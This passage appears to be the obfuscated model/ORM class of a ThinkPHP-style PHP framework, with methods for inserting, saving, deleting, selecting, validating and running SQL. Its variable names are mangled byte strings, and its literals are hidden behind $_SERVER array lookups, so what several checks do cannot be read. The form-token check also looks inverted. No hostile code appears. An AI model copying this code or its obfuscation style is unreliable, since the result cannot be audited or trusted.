$this->db->insert($ˆÈ›£, $ÛÄ„¹, $‹¸Èğ¹­); if (!1 !== $®ºÃœÄ) { $¤³•­±á = $this->getLastInsID(); if ($¤³•­±á) { $ˆÈ›£[$this->getPk()] = $¤³•­±á; $this->_after_insert($ˆÈ›£, $ÛÄ„¹); return $¤³•­±á; } $this->_after_insert($ˆÈ›£, $ÛÄ„¹); } return $®ºÃœÄ; } protected function _beforeInsert(&$É†ø…ìü, $šÀ‘şµä) { } protected function _after_insert($¤î±é‰¾, $™ë®Ü­†) { } public function addAll($‹Í¦Ñ¸, $ÁË–À×ã = array(), $šæİİáô = false) { $½âÍ‚ó =& $_SERVER[¹Û¹Æ€]; if (empty($‹Í¦Ñ¸)) { $this->error = think_lang($½âÍ‚ó[280]); return !1; } $ÁË–À×ã = $this->_parseOptions($ÁË–À×ã); foreach ($‹Í¦Ñ¸ as $Õêêâö¡ => $Úš±ÓŠ„) { $‹Í¦Ñ¸[$Õêêâö¡] = $this->_facade($Úš±ÓŠ„); } if (method_exists($this->db, $½âÍ‚ó[281])) { $Ü˜§©È = $this->db->insertAll($‹Í¦Ñ¸, $ÁË–À×ã, $šæİİáô); } else { $this->startTrans(); foreach ($‹Í¦Ñ¸ as $Õêêâö¡ => $Úš±ÓŠ„) { $Ü˜§©È = $this->db->insert($Úš±ÓŠ„, $ÁË–À×ã, $šæİİáô); } $this->commit(); } if (!1 !== $Ü˜§©È) { $ÉÄÜ¬¤ì = $this->getLastInsID(); if ($ÉÄÜ¬¤ì) { return $ÉÄÜ¬¤ì; } } return $Ü˜§©È; } public function selectAdd($‹ğ¥øß = '', $¨¤ºà²  = '', $ùéíà«ê = array()) { $†Òõ¦ÒÍ =& $_SERVER[¹Û¹Æ€]; $ùéíà«ê = $this->_parseOptions($ùéíà«ê); if (!1 === ($ı¢¨‡Û‰ = $this->db->selectInsert($‹ğ¥øß ? $‹ğ¥øß : $ùéíà«ê[$†Òõ¦ÒÍ[282]], $¨¤ºà²  ? $¨¤ºà²  : $this->getTableName(), $ùéíà«ê))) { $this->error = think_lang($†Òõ¦ÒÍ[283]); return !1; } else { return $ı¢¨‡Û‰; } } public function save($©¼ÜğÙñ = '', $¶Öòââù = array()) { $™¡­¼‚ß =& $_SERVER[¹Û¹Æ€]; if (empty($©¼ÜğÙñ)) { if (!empty($this->data)) { $©¼ÜğÙñ = $this->data; $this->data = array(); } else { $this->error = think_lang($™¡­¼‚ß[280]); return !1; } } $©¼ÜğÙñ = $this->_facade($©¼ÜğÙñ); $¶Öòââù = $this->_parseOptions($¶Öòââù); $¥ÉˆÃ© = $this->getPk(); if (!isset($¶Öòââù[$™¡­¼‚ß[284]])) { if (isset($©¼ÜğÙñ[$¥ÉˆÃ©])) { $Ù†çùËç[$¥ÉˆÃ©] = $©¼ÜğÙñ[$¥ÉˆÃ©]; $¶Öòââù[$™¡­¼‚ß[284]] = $Ù†çùËç; unset($©¼ÜğÙñ[$¥ÉˆÃ©]); } else { $this->error = think_lang($™¡­¼‚ß[283]); return !1; } } if (is_array($¶Öòââù[$™¡­¼‚ß[284]]) && isset($¶Öòââù[$™¡­¼‚ß[284]][$¥ÉˆÃ©])) { $ó®ÂË = $¶Öòââù[$™¡­¼‚ß[284]][$¥ÉˆÃ©]; } if (!1 === $this->_beforeUpdate($©¼ÜğÙñ, $¶Öòââù)) { return !1; } $¾öÔ®ìı = $this->db->update($©¼ÜğÙñ, $¶Öòââù); if (!1 !== $¾öÔ®ìı) { if (isset($ó®ÂË)) { $©¼ÜğÙñ[$¥ÉˆÃ©] = $ó®ÂË; } $this->_afterUpdate($©¼ÜğÙñ, $¶Öòââù); } return $¾öÔ®ìı; } protected function _beforeUpdate(&$ÍŸüùú, $áÕıÑ¯ç) { } protected function _afterUpdate($Ğ™¥èÙ°, $¹Ç¹ğÙ) { } public function delete($ø°½şÁ— = array()) { $¼È¢¤™Æ =& $_SERVER[¹Û¹Æ€]; if (empty($ø°½şÁ—) && empty($this->options[$¼È¢¤™Æ[284]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $†²¨‚œá = $this->getPk(); if (is_numeric($ø°½şÁ—) || is_string($ø°½şÁ—)) { if (strpos($ø°½şÁ—, $¼È¢¤™Æ[60])) { $¢…ü¿–[$†²¨‚œá] = array($¼È¢¤™Æ[285], $ø°½şÁ—); } else { $¢…ü¿–[$†²¨‚œá] = $ø°½şÁ—; } $this->options[$¼È¢¤™Æ[284]] = $¢…ü¿–; } $ø°½şÁ— = $this->_parseOptions(); if (is_array($ø°½şÁ—[$¼È¢¤™Æ[284]]) && isset($ø°½şÁ—[$¼È¢¤™Æ[284]][$†²¨‚œá])) { $“ÛÑæËæ = $ø°½şÁ—[$¼È¢¤™Æ[284]][$†²¨‚œá]; } $Ùà‘Ò‡î = $this->db->delete($ø°½şÁ—); if (!1 !== $Ùà‘Ò‡î) { $Å±Šæ = array(); if (isset($“ÛÑæËæ)) { $Å±Šæ[$†²¨‚œá] = $“ÛÑæËæ; } $this->_after_delete($Å±Šæ, $ø°½şÁ—); } return $Ùà‘Ò‡î; } protected function _after_delete($ëØ¬ÄõÛ, $²…àÏÚ) { } public function select($îó†îòÌ = array()) { $´ş¤†§Á =& $_SERVER[¹Û¹Æ€]; if (is_string($îó†îòÌ) || is_numeric($îó†îòÌ)) { $ØÒõ’öâ = $this->getPk(); if (strpos($îó†îòÌ, $´ş¤†§Á[60])) { $­ÕØ¦Ë‹[$ØÒõ’öâ] = array($´ş¤†§Á[285], $îó†îòÌ); } else { $­ÕØ¦Ë‹[$ØÒõ’öâ] = $îó†îòÌ; } $this->options[$´ş¤†§Á[284]] = $­ÕØ¦Ë‹; } elseif (!1 === $îó†îòÌ) { $îó†îòÌ = $this->_parseOptions(); return $´ş¤†§Á[286] . $this->db->buildSelectSql($îó†îòÌ) . $´ş¤†§Á[287]; } $îó†îòÌ = $this->_parseOptions(); $ì‘çĞë‡ = $this->db->select($îó†îòÌ); if (!1 === $ì‘çĞë‡) { return !1; } if (empty($ì‘çĞë‡)) { return null; } $this->_afterSelect($ì‘çĞë‡, $îó†îòÌ); return $ì‘çĞë‡; } protected function _afterSelect(&$Õ¾ÌÒÌ³, $…²ÄşÊ ) { } public function buildSql($³äíó…ª = array()) { $àù—ëİ¤ =& $_SERVER[¹Û¹Æ€]; $³äíó…ª = $this->_parseOptions($³äíó…ª); return $àù—ëİ¤[286] . $this->db->buildSelectSql($³äíó…ª) . $àù—ëİ¤[287]; } public function optionsValue($ÁÔÒåÄõ = null) { if (is_null($ÁÔÒåÄõ)) { return $this->options; } elseif (is_array($ÁÔÒåÄõ)) { $this->options = array_merge($this->options, $ÁÔÒåÄõ); } } protected function _parseOptions($ÛøƒõŞ¼ = array()) { $Çµ§Óš¶ =& $_SERVER[¹Û¹Æ€]; if (is_array($ÛøƒõŞ¼)) { $ÛøƒõŞ¼ = array_merge($this->options, $ÛøƒõŞ¼); } $this->options = array(); if (!isset($ÛøƒõŞ¼[$Çµ§Óš¶[288]])) { $ÛøƒõŞ¼[$Çµ§Óš¶[288]] = $this->getTableName(); $‚‘½Ş¸Ÿ = $this->fields; } else { $‚‘½Ş¸Ÿ = $this->getDbFields(); } if (!empty($ÛøƒõŞ¼[$Çµ§Óš¶[289]])) { $ÛøƒõŞ¼[$Çµ§Óš¶[288]] .= $Çµ§Óš¶[63] . $ÛøƒõŞ¼[$Çµ§Óš¶[289]]; } $ÛøƒõŞ¼[$Çµ§Óš¶[290]] = $this->name; if (isset($ÛøƒõŞ¼[$Çµ§Óš¶[284]]) && is_array($ÛøƒõŞ¼[$Çµ§Óš¶[284]]) && !empty($‚‘½Ş¸Ÿ) && !isset($ÛøƒõŞ¼[$Çµ§Óš¶[291]]) && !isset($ÛøƒõŞ¼[$Çµ§Óš¶[288]])) { foreach ($ÛøƒõŞ¼[$Çµ§Óš¶[284]] as $òşÔòû => $Â“ş¡”Ç) { $òşÔòû = trim($òşÔòû); if (in_array($òşÔòû, $‚‘½Ş¸Ÿ, !0)) { if (is_scalar($Â“ş¡”Ç)) { $this->_parseType($ÛøƒõŞ¼[$Çµ§Óš¶[284]], $òşÔòû); } } elseif (!is_numeric($òşÔòû) && $Çµ§Óš¶[21] != substr($òşÔòû, 0, 1) && !1 === strpos($òşÔòû, $Çµ§Óš¶[20]) && !1 === strpos($òşÔòû, $Çµ§Óš¶[269]) && !1 === strpos($òşÔòû, $Çµ§Óš¶[292]) && !1 === strpos($òşÔòû, $Çµ§Óš¶[293])) { unset($ÛøƒõŞ¼[$Çµ§Óš¶[284]][$òşÔòû]); } } } $this->_options_filter($ÛøƒõŞ¼); return $ÛøƒõŞ¼; } protected function _options_filter(&$È»”ÁŸ×) { } protected function _parseType(&$ˆ¨»Æ‹, $ĞÌäúú) { $´™É÷š™ =& $_SERVER[¹Û¹Æ€]; if (empty($this->options[$´™É÷š™[294]][$´™É÷š™[4] . $ĞÌäúú])) { $Ààª„¾ = strtolower($this->fields[$´™É÷š™[261]][$ĞÌäúú]); if (!1 !== strpos($Ààª„¾, $´™É÷š™[295])) { } elseif (!1 === strpos($Ààª„¾, $´™É÷š™[296]) && !1 !== strpos($Ààª„¾, $´™É÷š™[297])) { $ˆ¨»Æ‹[$ĞÌäúú] = intval($ˆ¨»Æ‹[$ĞÌäúú]); } elseif (!1 !== strpos($Ààª„¾, $´™É÷š™[298]) || !1 !== strpos($Ààª„¾, $´™É÷š™[299])) { $ˆ¨»Æ‹[$ĞÌäúú] = floatval($ˆ¨»Æ‹[$ĞÌäúú]); } elseif (!1 !== strpos($Ààª„¾, $´™É÷š™[300])) { $ˆ¨»Æ‹[$ĞÌäúú] = (bool) $ˆ¨»Æ‹[$ĞÌäúú]; } } } public function find($“ÔÈ×¢„ = array()) { $¶„ë÷ =& $_SERVER[¹Û¹Æ€]; if (is_numeric($“ÔÈ×¢„) || is_string($“ÔÈ×¢„)) { $÷ÁÚ¸Ë£[$this->getPk()] = intval($“ÔÈ×¢„); $this->options[$¶„ë÷[284]] = $÷ÁÚ¸Ë£; } $this->options[$¶„ë÷[301]] = 1; $“ÔÈ×¢„ = $this->_parseOptions(); $ğùå±şÕ = $this->db->select($“ÔÈ×¢„); if (!1 === $ğùå±şÕ) { return !1; } if (empty($ğùå±şÕ)) { return null; } $this->data = $ğùå±şÕ[0]; $this->_afterFind($this->data, $“ÔÈ×¢„); if (!empty($this->options[$¶„ë÷[302]])) { return $this->returnResult($this->data, $this->options[$¶„ë÷[302]]); } return $this->data; } protected function _afterFind(&$ÛÈñÛœ, $ûƒşü§î) { } protected function returnResult($˜æğ¼Ÿ’, $Ñ »ô’² = '') { $ÍÍ»¹ “ =& $_SERVER[¹Û¹Æ€]; if ($Ñ »ô’²) { if (is_callable($Ñ »ô’²)) { return call_user_func($Ñ »ô’², $˜æğ¼Ÿ’); } switch (strtolower($Ñ »ô’²)) { case $ÍÍ»¹ “[303]: return json_encode($˜æğ¼Ÿ’); case $ÍÍ»¹ “[304]: return xml_encode($˜æğ¼Ÿ’); } } return $˜æğ¼Ÿ’; } public function parseFieldsMap($Ÿ§Í…ıÅ, $ïõâ†‘à = 1) { if (!empty($this->_map)) { foreach ($this->_map as $­ö½§ => $°¬ùÆï) { if ($ïõâ†‘à == 1) { if (isset($Ÿ§Í…ıÅ[$°¬ùÆï])) { $Ÿ§Í…ıÅ[$­ö½§] = $Ÿ§Í…ıÅ[$°¬ùÆï]; unset($Ÿ§Í…ıÅ[$°¬ùÆï]); } } else { if (isset($Ÿ§Í…ıÅ[$­ö½§])) { $Ÿ§Í…ıÅ[$°¬ùÆï] = $Ÿ§Í…ıÅ[$­ö½§]; unset($Ÿ§Í…ıÅ[$­ö½§]); } } } } return $Ÿ§Í…ıÅ; } public function setField($Áò´¼šà, $üÔÂÄ¦Ú = '') { if (is_array($Áò´¼šà)) { $ÜÖòô¦ = $Áò´¼šà; } else { $ÜÖòô¦[$Áò´¼šà] = $üÔÂÄ¦Ú; } return $this->save($ÜÖòô¦); } public function setAdd($–‹æš“ë, $Ä÷“ŞŸŒ = 1) { $“ñ¤Ê«‰ =& $_SERVER[¹Û¹Æ€]; $ôœÎüú = $–‹æš“ë . $“ñ¤Ê«‰[305] . $Ä÷“ŞŸŒ; if ($Ä÷“ŞŸŒ < 0) { $ôœÎüú = $–‹æš“ë . $Ä÷“ŞŸŒ; } return $this->setField($–‹æš“ë, array($“ñ¤Ê«‰[306], $ôœÎüú)); } public function getField($´´„ô‹è, $Ú«ìÍ° = null) { $¡–¢‹Ó† =& $_SERVER[¹Û¹Æ€]; $”«‹ˆÏõ[$¡–¢‹Ó†[282]] = $´´„ô‹è; $”«‹ˆÏõ = $this->_parseOptions($”«‹ˆÏõ); $´´„ô‹è = trim($´´„ô‹è); if (strpos($´´„ô‹è, $¡–¢‹Ó†[60])) { if (!isset($”«‹ˆÏõ[$¡–¢‹Ó†[301]])) { $”«‹ˆÏõ[$¡–¢‹Ó†[301]] = is_numeric($Ú«ìÍ°) ? $Ú«ìÍ° : $¡–¢‹Ó†[22]; } $ËÖĞ«²ö = $this->db->select($”«‹ˆÏõ); if (!empty($ËÖĞ«²ö)) { $§ÈÚÀë = explode($¡–¢‹Ó†[60], $´´„ô‹è); $´´„ô‹è = array_keys($ËÖĞ«²ö[0]); $ÜÉ”ŒË = array_shift($´´„ô‹è); $ØÈ“Ä› = array_shift($´´„ô‹è); $ÓÛÉĞä’ = array(); $ÒŒ—Çêã = count($§ÈÚÀë); foreach ($ËÖĞ«²ö as $Êş“ú—¼) { $ºèëŠ— = $Êş“ú—¼[$ÜÉ”ŒË]; if (2 == $ÒŒ—Çêã) { $ÓÛÉĞä’[$ºèëŠ—] = $Êş“ú—¼[$ØÈ“Ä›]; } else { $ÓÛÉĞä’[$ºèëŠ—] = is_string($Ú«ìÍ°) ? implode($Ú«ìÍ°, $Êş“ú—¼) : $Êş“ú—¼; } } return $ÓÛÉĞä’; } } else { if (!0 !== $Ú«ìÍ°) { $”«‹ˆÏõ[$¡–¢‹Ó†[301]] = is_numeric($Ú«ìÍ°) ? $Ú«ìÍ° : 1; } if ($Ú«ìÍ° === $¡–¢‹Ó†[264]) { unset($”«‹ˆÏõ[$¡–¢‹Ó†[301]]); } $Êş“ú—¼ = $this->db->select($”«‹ˆÏõ); if (!empty($Êş“ú—¼)) { if ($Ú«ìÍ° === $¡–¢‹Ó†[264]) { return reset($Êş“ú—¼[0]); } if (!0 !== $Ú«ìÍ° && 1 == $”«‹ˆÏõ[$¡–¢‹Ó†[301]]) { return reset($Êş“ú—¼[0]); } foreach ($Êş“ú—¼ as $ÕË–ûæ) { $Ãşã‘[] = $ÕË–ûæ[$´´„ô‹è]; } return $Ãşã‘; } } return null; } public function create($Ã±ôÓñ = '', $éóĞÛêç = '') { $¼¤ï™¿ï =& $_SERVER[¹Û¹Æ€]; if (empty($Ã±ôÓñ)) { $Ã±ôÓñ = $_POST; } elseif (is_object($Ã±ôÓñ)) { $Ã±ôÓñ = get_object_vars($Ã±ôÓñ); } if (empty($Ã±ôÓñ) || !is_array($Ã±ôÓñ)) { $this->error = think_lang($¼¤ï™¿ï[280]); return !1; } $Ã±ôÓñ = $this->parseFieldsMap($Ã±ôÓñ, 0); $éóĞÛêç = $éóĞÛêç ? $éóĞÛêç : (!empty($Ã±ôÓñ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$¼¤ï™¿ï[282]])) { $ãÛŸ‘ªÉ = $this->options[$¼¤ï™¿ï[282]]; unset($this->options[$¼¤ï™¿ï[282]]); } elseif ($éóĞÛêç == THINK_MODEL_INSERT && isset($this->insertFields)) { $ãÛŸ‘ªÉ = $this->insertFields; } elseif ($éóĞÛêç == THINK_MODEL_UPDATE && isset($this->updateFields)) { $ãÛŸ‘ªÉ = $this->updateFields; } if (isset($ãÛŸ‘ªÉ)) { if (is_string($ãÛŸ‘ªÉ)) { $ãÛŸ‘ªÉ = explode($¼¤ï™¿ï[60], $ãÛŸ‘ªÉ); } if (think_config($¼¤ï™¿ï[307])) { $ãÛŸ‘ªÉ[] = think_config($¼¤ï™¿ï[308]); } foreach ($Ã±ôÓñ as $¡Ä±»ê => $¤°Û´ï) { if (!in_array($¡Ä±»ê, $ãÛŸ‘ªÉ)) { unset($Ã±ôÓñ[$¡Ä±»ê]); } } } if (!$this->autoValidation($Ã±ôÓñ, $éóĞÛêç)) { return !1; } if (!$this->autoCheckToken($Ã±ôÓñ)) { $this->error = think_lang($¼¤ï™¿ï[309]); return !1; } if ($this->autoCheckFields) { $ãÛŸ‘ªÉ = $this->getDbFields(); foreach ($Ã±ôÓñ as $¡Ä±»ê => $¤°Û´ï) { if (!in_array($¡Ä±»ê, $ãÛŸ‘ªÉ)) { unset($Ã±ôÓñ[$¡Ä±»ê]); } elseif (MAGIC_QUOTES_GPC && is_string($¤°Û´ï)) { $Ã±ôÓñ[$¡Ä±»ê] = stripslashes($¤°Û´ï); } } } $this->autoOperation($Ã±ôÓñ, $éóĞÛêç); $this->data = $Ã±ôÓñ; return $Ã±ôÓñ; } public function autoCheckToken($ºˆü¹ßä) { $ßËîĞ =& $_SERVER[¹Û¹Æ€]; if (isset($this->options[$ßËîĞ[310]]) && !$this->options[$ßËîĞ[310]]) { return !0; } if (think_config($ßËîĞ[307])) { $ï’òåÏ = think_config($ßËîĞ[308]); if (!isset($ºˆü¹ßä[$ï’òåÏ]) || Session::get($ï’òåÏ)) { return !1; } list($÷“Óëú¡, $‹¢šÛ†) = explode($ßËîĞ[21], $ºˆü¹ßä[$ï’òåÏ]); if ($‹¢šÛ† && Session::get($ï’òåÏ . $ßËîĞ[20] . $÷“Óëú¡) === $‹¢šÛ†) { Session::remove($ï’òåÏ . $ßËîĞ[20] . $÷“Óëú¡); return !0; } if (think_config($ßËîĞ[311])) { Session::remove($ï’òåÏ . $ßËîĞ[20] . $÷“Óëú¡); } return !1; } return !0; } public function regex($ãò×ªÁ, $Ä˜ÎÑ»ä) { $ ¢òäÑ£ =& $_SERVER[¹Û¹Æ€]; $ó±½Ãòà = array($ ¢òäÑ£[312] => $ ¢òäÑ£[313], $ ¢òäÑ£[314] => $ ¢òäÑ£[315], $ ¢òäÑ£[316] => $ ¢òäÑ£[317], $ ¢òäÑ£[318] => $ ¢òäÑ£[319], $ ¢òäÑ£[320] => $ ¢òäÑ£[321], $ ¢òäÑ£[322] => $ ¢òäÑ£[323], $ ¢òäÑ£[324] => $ ¢òäÑ£[325], $ ¢òäÑ£[299] => $ ¢òäÑ£[326], $ ¢òäÑ£[327] => $ ¢òäÑ£[328]); if (isset($ó±½Ãòà[strtolower($Ä˜ÎÑ»ä)])) { $Ä˜ÎÑ»ä = $ó±½Ãòà[strtolower($Ä˜ÎÑ»ä)]; } return preg_match($Ä˜ÎÑ»ä, $ãò×ªÁ) === 1; } private function autoOperation(&$±€’á´, $®±›€¦Ú) { $ßœÅÒÎ =& $_SERVER[¹Û¹Æ€]; if (!empty($this->options[$ßœÅÒÎ[329]])) { $ïÃïÙ¸ = $this->options[$ßœÅÒÎ[329]]; unset($this->options[$ßœÅÒÎ[329]]); } elseif (!empty($this->_auto)) { $ïÃïÙ¸ = $this->_auto; } if (isset($ïÃïÙ¸)) { foreach ($ïÃïÙ¸ as $’°•Ø˜Å) { if (empty($’°•Ø˜Å[2])) { $’°•Ø˜Å[2] = THINK_MODEL_INSERT; } if ($®±›€¦Ú == $’°•Ø˜Å[2] || $’°•Ø˜Å[2] == THINK_MODEL_BOTH) { switch (trim($’°•Ø˜Å[3])) { case $ßœÅÒÎ[330]: case $ßœÅÒÎ[331]: $ñÅ·àµş = isset($’°•Ø˜Å[4]) ? (array) $’°•Ø˜Å[4] : array(); if (isset($±€’á´[$’°•Ø˜Å[0]])) { array_unshift($ñÅ·àµş, $±€’á´[$’°•Ø˜Å[0]]); } if ($ßœÅÒÎ[330] == $’°•Ø˜Å[3]) { $±€’á´[$’°•Ø˜Å[0]] = call_user_func_array($’°•Ø˜Å[1], $ñÅ·àµş); } else { $±€’á´[$’°•Ø˜Å[0]] = call_user_func_array(array(&$this, $’°•Ø˜Å[1]), $ñÅ·àµş); } break; case $ßœÅÒÎ[282]: $±€’á´[$’°•Ø˜Å[0]] = $±€’á´[$’°•Ø˜Å[1]]; break; case $ßœÅÒÎ[332]: if ($ßœÅÒÎ[22] === $±€’á´[$’°•Ø˜Å[0]]) { unset($±€’á´[$’°•Ø˜Å[0]]); } break; case $ßœÅÒÎ[333]: default: $±€’á´[$’°•Ø˜Å[0]] = $’°•Ø˜Å[1]; } if (!1 === $±€’á´[$’°•Ø˜Å[0]]) { unset($±€’á´[$’°•Ø˜Å[0]]); } } } } return $±€’á´; } protected function autoValidation($ß¡îÔöÌ, $ªÌş’Ÿ—) { $ğæ­¾Çè =& $_SERVER[¹Û¹Æ€]; if (!empty($this->options[$ğæ­¾Çè[334]])) { $Ò¼¹ö‡ = $this->options[$ğæ­¾Çè[334]]; unset($this->options[$ğæ­¾Çè[334]]); } elseif (!empty($this->_validate)) { $Ò¼¹ö‡ = $this->_validate; } if (isset($Ò¼¹ö‡)) { if ($this->patchValidate) { $this->error = array(); } foreach ($Ò¼¹ö‡ as $°¹‘…³ã => $öÑ‚í¤¸) { if (empty($öÑ‚í¤¸[5]) || $öÑ‚í¤¸[5] == THINK_MODEL_BOTH || $öÑ‚í¤¸[5] == $ªÌş’Ÿ—) { if (0 == strpos($öÑ‚í¤¸[2], $ğæ­¾Çè[335]) && strpos($öÑ‚í¤¸[2], $ğæ­¾Çè[336])) { $öÑ‚í¤¸[2] = think_lang(substr($öÑ‚í¤¸[2], 2, -1)); } $öÑ‚í¤¸[3] = isset($öÑ‚í¤¸[3]) ? $öÑ‚í¤¸[3] : THINK_EXISTS_VALIDATE; $öÑ‚í¤¸[4] = isset($öÑ‚í¤¸[4]) ? $öÑ‚í¤¸[4] : $ğæ­¾Çè[337]; switch ($öÑ‚í¤¸[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($ß¡îÔöÌ, $öÑ‚í¤¸)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($ğæ­¾Çè[22] != trim($ß¡îÔöÌ[$öÑ‚í¤¸[0]])) { if (!1 === $this->_validationField($ß¡îÔöÌ, $öÑ‚í¤¸)) { return !1; } } break; default: if (isset($ß¡îÔöÌ[$öÑ‚í¤¸[0]])) { if (!1 === $this->_validationField($ß¡îÔöÌ, $öÑ‚í¤¸)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($çşØ¥ñ‚, $©…³àÕ ) { if (!1 === $this->_validationFieldItem($çşØ¥ñ‚, $©…³àÕ )) { if ($this->patchValidate) { $this->error[$©…³àÕ [0]] = $©…³àÕ [2]; } else { $this->error = $©…³àÕ [2]; return !1; } } return; } protected function _validationFieldItem($†›º¼Å—, $Öö´Ğ…ò) { $¬ÜŒ¢Ô =& $_SERVER[¹Û¹Æ€]; switch (strtolower(trim($Öö´Ğ…ò[4]))) { case $¬ÜŒ¢Ô[330]: case $¬ÜŒ¢Ô[331]: $‡“£ÙÁ‹ = isset($Öö´Ğ…ò[6]) ? (array) $Öö´Ğ…ò[6] : array(); if (is_string($Öö´Ğ…ò[0]) && strpos($Öö´Ğ…ò[0], $¬ÜŒ¢Ô[60])) { $Öö´Ğ…ò[0] = explode($¬ÜŒ¢Ô[60], $Öö´Ğ…ò[0]); } if (is_array($Öö´Ğ…ò[0])) { foreach ($Öö´Ğ…ò[0] as $ï¤›Çºß) { $©èÊÒåÔ[$ï¤›Çºß] = $†›º¼Å—[$ï¤›Çºß]; } array_unshift($‡“£ÙÁ‹, $©èÊÒåÔ); } else { array_unshift($‡“£ÙÁ‹, $†›º¼Å—[$Öö´Ğ…ò[0]]); } if ($¬ÜŒ¢Ô[330] == $Öö´Ğ…ò[4]) { return call_user_func_array($Öö´Ğ…ò[1], $‡“£ÙÁ‹); } else { return call_user_func_array(array(&$this, $Öö´Ğ…ò[1]), $‡“£ÙÁ‹); } case $¬ÜŒ¢Ô[338]: return $†›º¼Å—[$Öö´Ğ…ò[0]] == $†›º¼Å—[$Öö´Ğ…ò[1]]; case $¬ÜŒ¢Ô[339]: if (is_string($Öö´Ğ…ò[0]) && strpos($Öö´Ğ…ò[0], $¬ÜŒ¢Ô[60])) { $Öö´Ğ…ò[0] = explode($¬ÜŒ¢Ô[60], $Öö´Ğ…ò[0]); } $’®ªêó = array(); if (is_array($Öö´Ğ…ò[0])) { foreach ($Öö´Ğ…ò[0] as $ï¤›Çºß) { $’®ªêó[$ï¤›Çºß] = $†›º¼Å—[$ï¤›Çºß]; } } else { $’®ªêó[$Öö´Ğ…ò[0]] = $†›º¼Å—[$Öö´Ğ…ò[0]]; } if (!empty($†›º¼Å—[$this->getPk()])) { $’®ªêó[$this->getPk()] = array($¬ÜŒ¢Ô[340], $†›º¼Å—[$this->getPk()]); } if ($this->where($’®ªêó)->find()) { return !1; } return !0; default: return $this->check($†›º¼Å—[$Öö´Ğ…ò[0]], $Öö´Ğ…ò[1], $Öö´Ğ…ò[4]); } } public function check($ÁÖªªßó, $ĞÎö‹Ïñ, $ù¥òøÁ’ = "\162\x65\147\145\170") { $—ÙïĞ›ı =& $_SERVER[¹Û¹Æ€]; $ù¥òøÁ’ = strtolower(trim($ù¥òøÁ’)); switch ($ù¥òøÁ’) { case $—ÙïĞ›ı[17]: case $—ÙïĞ›ı[341]: $ˆê¥®¦ä = is_array($ĞÎö‹Ïñ) ? $ĞÎö‹Ïñ : explode($—ÙïĞ›ı[60], $ĞÎö‹Ïñ); return $ù¥òøÁ’ == $—ÙïĞ›ı[17] ? in_array($ÁÖªªßó, $ˆê¥®¦ä) : !in_array($ÁÖªªßó, $ˆê¥®¦ä); case $—ÙïĞ›ı[342]: case $—ÙïĞ›ı[343]: if (is_array($ĞÎö‹Ïñ)) { $Ì÷›ôôà = $ĞÎö‹Ïñ[0]; $Ÿ¬Ïå¨ç = $ĞÎö‹Ïñ[1]; } else { list($Ì÷›ôôà, $Ÿ¬Ïå¨ç) = explode($—ÙïĞ›ı[60], $ĞÎö‹Ïñ); } return $ù¥òøÁ’ == $—ÙïĞ›ı[342] ? $ÁÖªªßó >= $Ì÷›ôôà && $ÁÖªªßó <= $Ÿ¬Ïå¨ç : $ÁÖªªßó < $Ì÷›ôôà || $ÁÖªªßó > $Ÿ¬Ïå¨ç; case $—ÙïĞ›ı[344]: case $—ÙïĞ›ı[345]: return $ù¥òøÁ’ == $—ÙïĞ›ı[344] ? $ÁÖªªßó == $ĞÎö‹Ïñ : $ÁÖªªßó != $ĞÎö‹Ïñ; case $—ÙïĞ›ı[346]: $Æ¿Ÿ´’£ = mb_strlen($ÁÖªªßó, $—ÙïĞ›ı[347]); if (strpos($ĞÎö‹Ïñ, $—ÙïĞ›ı[60])) { list($Ì÷›ôôà, $Ÿ¬Ïå¨ç) = explode($—ÙïĞ›ı[60], $ĞÎö‹Ïñ); return $Æ¿Ÿ´’£ >= $Ì÷›ôôà && $Æ¿Ÿ´’£ <= $Ÿ¬Ïå¨ç; } else { return $Æ¿Ÿ´’£ == $ĞÎö‹Ïñ; } case $—ÙïĞ›ı[348]: list($÷§·‹®¨, $ˆ€¬í‡Ÿ) = explode($—ÙïĞ›ı[60], $ĞÎö‹Ïñ); if (!is_numeric($÷§·‹®¨)) { $÷§·‹®¨ = strtotime($÷§·‹®¨); } if (!is_numeric($ˆ€¬í‡Ÿ)) { $ˆ€¬í‡Ÿ = strtotime($ˆ€¬í‡Ÿ); } return NOW_TIME >= $÷§·‹®¨ && NOW_TIME <= $ˆ€¬í‡Ÿ; case $—ÙïĞ›ı[349]: return in_array(get_client_ip(), explode($—ÙïĞ›ı[60], $ĞÎö‹Ïñ)); case $—ÙïĞ›ı[350]: return !in_array(get_client_ip(), explode($—ÙïĞ›ı[60], $ĞÎö‹Ïñ)); case $—ÙïĞ›ı[337]: default: return $this->regex($ÁÖªªßó, $ĞÎö‹Ïñ); } } public function query($º³Ú…Óë, $ÊıªæÌ¼ = false) { $¤ğñ–¼« =& $_SERVER[¹Û¹Æ€]; if (!is_bool($ÊıªæÌ¼) && !is_array($ÊıªæÌ¼)) { $ÊıªæÌ¼ = func_get_args(); array_shift($ÊıªæÌ¼); } $º³Ú…Óë = str_replace(array($¤ğñ–¼«[12], $¤ğñ–¼«[351]), $¤ğñ–¼«[63], $º³Ú…Óë); $º³Ú…Óë = $this->parseSql($º³Ú…Óë, $ÊıªæÌ¼); return $this->db->query($º³Ú…Óë); } public function execute($¡ÂÈÁÂ‡, $¤é“‘Ä = false) { if (!is_bool($¤é“‘Ä) && !is_array($¤é“‘Ä)) { $¤é“‘Ä = func_get_args(); array_shift($¤é“‘Ä); } $¡ÂÈÁÂ‡ = $this->parseSql($¡ÂÈÁÂ‡, $¤é“‘Ä); return $this->db->execute($¡ÂÈÁÂ‡); } protected function parseSql($æø¼í˜õ, $ÙöÚÂ¢†) { $Ô‘Â»ª =& $_SERVER[¹Û¹Æ€]; if (!0 === $ÙöÚÂ¢†) { $ÑÕ²ÄùÕ = $this->_parseOptions(); $æø¼í˜õ = $this->db->parseSql($æø¼í˜õ, $ÑÕ²ÄùÕ); } elseif (is_array($ÙöÚÂ¢†)) { $ÙöÚÂ¢† = array_map(array($this->db, $Ô‘Â»ª[352]), $ÙöÚÂ¢†); $æø¼í˜õ = vsprintf($æø¼í˜õ, $ÙöÚÂ¢†); } else { $æø¼í˜õ = strtr($æø¼í˜õ, array($Ô‘Â»ª[353] => $this->getTableName(), $Ô‘Â»ª[354] => think_config($Ô‘Â»ª[253]))); } $this->db->setModel($this->name); 